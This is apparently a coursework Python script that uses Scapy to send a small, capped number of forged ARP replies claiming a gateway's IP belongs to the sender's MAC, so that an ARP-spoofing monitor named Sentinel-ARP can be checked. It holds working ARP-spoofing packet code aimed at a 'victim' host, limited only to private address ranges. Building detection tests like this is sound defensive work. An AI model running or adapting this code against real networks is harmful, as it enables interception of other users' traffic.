# Coursework test utility intended only for use on networks owned and operated by the team, to validate the Sentinel-ARP monitoring system.
"""ARP test traffic generator for Sentinel-ARP detection verification."""

import argparse
import ipaddress
import sys
import time
from typing import Optional

try:
    from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    ARP = None
    Ether = None
    conf = None
    get_if_hwaddr = None
    sendp = None

ALLOWED_PRIVATE_NETWORKS = (
    ipaddress.IPv4Network("10.0.0.0/8"),
    ipaddress.IPv4Network("172.16.0.0/12"),
    ipaddress.IPv4Network("192.168.0.0/16"),
)
MAX_COUNT_LIMIT = 50


def is_allowed_private_address(ip_str: str) -> bool:
    """Validate that an IP string is a valid IPv4 address in RFC 1918 private ranges."""
    if not ip_str or not isinstance(ip_str, str):
        return False
    try:
        ip = ipaddress.IPv4Address(ip_str.strip())
        return any(ip in net for net in ALLOWED_PRIVATE_NETWORKS)
    except (ValueError, ipaddress.AddressValueError):
        return False


def build_arp_reply_packet(gateway_ip: str, target_ip: str, sender_mac: str):
    """Build an ARP reply (is-at) packet claiming gateway_ip is associated with sender_mac."""
    return Ether(dst="ff:ff:ff:ff:ff:ff", src=sender_mac) / ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=sender_mac,
        pdst=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )


def send_test_arp_replies(
    target_ip: str,
    gateway_ip: str,
    iface: str,
    count: int = 3,
    delay_seconds: float = 1.0,
    custom_mac: Optional[str] = None,
) -> int:
    """Send a finite number of test ARP reply packets with a one-second pause."""
    if not SCAPY_AVAILABLE:
        sys.stderr.write(
            "[-] Error: Scapy library is required for ARP packet construction.\n"
            "    Install with: pip install scapy\n"
        )
        return 1

    # Resolve sender MAC address on the specified interface
    if custom_mac:
        sender_mac = custom_mac.lower()
    else:
        try:
            sender_mac = get_if_hwaddr(iface).lower()
        except Exception as err:
            sys.stderr.write(f"[-] Error: Could not resolve MAC address for interface '{iface}': {err}\n")
            return 1

    print(
        f"[*] Initializing ARP test stream on interface '{iface}'\n"
        f"    Target (victim):  {target_ip}\n"
        f"    Gateway:          {gateway_ip}\n"
        f"    Sender MAC:       {sender_mac}\n"
        f"    Packet Count:     {count}\n"
        f"    Interval:         {delay_seconds}s",
        flush=True,
    )

    packet = build_arp_reply_packet(gateway_ip=gateway_ip, target_ip=target_ip, sender_mac=sender_mac)

    sent_count = 0
    for i in range(1, count + 1):
        print(
            f"[TEST] Sending ARP reply ({i}/{count}): gateway {gateway_ip} is at {sender_mac} -> target {target_ip}",
            flush=True,
        )
        try:
            sendp(packet, iface=iface, verbose=False)
            sent_count += 1
        except Exception as err:
            sys.stderr.write(f"[-] Transmission error on packet {i}: {err}\n")
            break

        if i < count:
            time.sleep(delay_seconds)

    print(
        f"[SUMMARY] Sent {sent_count}/{count} test ARP reply packets. Stopping test.",
        flush=True,
    )
    return 0 if sent_count == count else 1


def parse_args(args=None):
    """Parse and validate command line arguments."""
    parser = argparse.ArgumentParser(
        description="Controlled ARP test traffic utility for Sentinel-ARP validation (Private lab network only)."
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Private IPv4 address of test device/victim (10.x, 172.16-31.x, 192.168.x)",
    )
    parser.add_argument(
        "--gateway",
        required=True,
        help="Private IPv4 address of gateway to test impersonation detection",
    )
    parser.add_argument(
        "--iface",
        required=True,
        help="Network interface to send test packets on",
    )
    parser.add_argument(
        "--count",
        default=3,
        type=int,
        help="Number of ARP reply packets to send (default: 3, max: 50)",
    )
    return parser.parse_args(args)


def main(args=None):
    parsed = parse_args(args)

    # Validate target IP
    if not is_allowed_private_address(parsed.target):
        sys.stderr.write(
            f"[-] Error: Target IP '{parsed.target}' is outside allowed private IPv4 ranges "
            "(10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).\n"
        )
        sys.exit(1)

    # Validate gateway IP
    if not is_allowed_private_address(parsed.gateway):
        sys.stderr.write(
            f"[-] Error: Gateway IP '{parsed.gateway}' is outside allowed private IPv4 ranges "
            "(10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).\n"
        )
        sys.exit(1)

    # Validate count
    if parsed.count <= 0:
        sys.stderr.write(f"[-] Error: Packet count must be a positive integer, got {parsed.count}.\n")
        sys.exit(1)

    if parsed.count > MAX_COUNT_LIMIT:
        sys.stderr.write(
            f"[-] Error: Packet count {parsed.count} exceeds safety cap of {MAX_COUNT_LIMIT}.\n"
        )
        sys.exit(1)

    exit_code = send_test_arp_replies(
        target_ip=parsed.target,
        gateway_ip=parsed.gateway,
        iface=parsed.iface,
        count=parsed.count,
    )
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
